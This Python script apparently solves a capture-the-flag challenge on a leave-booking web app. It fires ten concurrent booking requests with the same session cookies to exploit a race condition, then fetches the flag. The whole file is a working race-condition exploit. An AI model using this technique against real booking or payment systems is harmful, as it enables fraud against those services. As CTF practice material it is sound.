from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

TARGET = "solde-conges.cyberzerk.fr"
BASE_URL = f"https://{TARGET}"
BOOK_REQUESTS = 10


def start(session):
    response = session.post(f"{BASE_URL}/start")
    response.raise_for_status()
    print(response.text)
    print(f"Session cookies: {session.cookies.get_dict()}")


def book(cookies):
    response = requests.post(f"{BASE_URL}/book", cookies=cookies)
    return response.status_code, response.text


def flag(session):
    response = session.get(f"{BASE_URL}/flag")
    print(f"/flag -> {response.status_code}: {response.text}")


with requests.Session() as session:
    start(session)
    cookies = session.cookies.get_dict()

    with ThreadPoolExecutor(max_workers=BOOK_REQUESTS) as executor:
        futures = [executor.submit(book, cookies) for _ in range(BOOK_REQUESTS)]
        for future in as_completed(futures):
            status_code, body = future.result()
            print(f"/book -> {status_code}: {body}")

    flag(session)